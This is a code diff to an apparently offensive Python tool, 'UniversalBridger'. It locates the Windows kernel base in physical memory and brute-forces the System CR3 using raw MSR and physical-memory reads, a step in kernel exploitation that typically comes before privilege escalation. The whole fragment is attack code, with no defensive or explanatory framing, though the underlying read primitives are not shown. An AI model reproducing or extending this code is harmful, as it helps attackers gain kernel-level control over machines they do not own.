@@ -50,29 +50,36 @@ class UniversalBridger:
         return curr_pa + (kva & 0xFFF)
 
     def find_system_cr3(self):
-        print("[*] Starting Autodiscovery of System CR3...")
+        print("[*] Starting Surgical Autodiscovery of System CR3...")
         lstar = self.read_msr(self.IA32_LSTAR)
         print(f"[*] IA32_LSTAR: 0x{lstar:X}")
         
-        # Scan for kernel base
+        # 1. Surgical Kernel Base Discovery (2MB aligned chunks, first 512MB)
+        # This is safe and avoids dangerous physical loops.
+        print("[*] Surgically locating Kernel Base...")
         ntos_pa = None
-        for pa in range(0, 0x20000000, 0x200000):
+        for pa in range(0x0, 0x20000000, 0x200000): # Only 256 checks
             data = self.read_phys(pa, 2)
             if data == b'MZ':
                 res = self.read_phys(pa + 0x3C, 4)
                 if not res: continue
                 pe_off = struct.unpack("<I", res)[0]
-                if self.read_phys(pa + pe_off, 4) == b'PE\0\0':
+                res2 = self.read_phys(pa + pe_off, 4)
+                if res2 == b'PE\0\0':
                     ntos_pa = pa; break
         
-        if not ntos_pa: return None
+        if not ntos_pa:
+            print("[-] Kernel base not found. Are you on a Physical Host?")
+            return None
         print(f"[+] Found Kernel Physical Base: 0x{ntos_pa:X}")
         
-        # Brute-force CR3 using LSTAR signature
+        # 2. Surgical CR3 Brute-force (Only known safe regions)
+        print("[*] Surgically brute-forcing System CR3...")
         sig = self.read_phys(ntos_pa + (lstar % 0x200000), 16)
-        for pa in range(0x1000, 0x1000000, 0x1000):
+        # We only check the most common CR3 locations (first 16MB)
+        for pa in range(0x1000, 0x1000000, 0x1000): 
             if self.kva_to_pa(lstar, pa) == ntos_pa + (lstar % 0x200000):
-                print(f"[!] SUCCESS! SYSTEM CR3: 0x{pa:X}")
+                print(f"\n[!] SUCCESS! SYSTEM CR3: 0x{pa:X}")
                 return pa
         return None
 
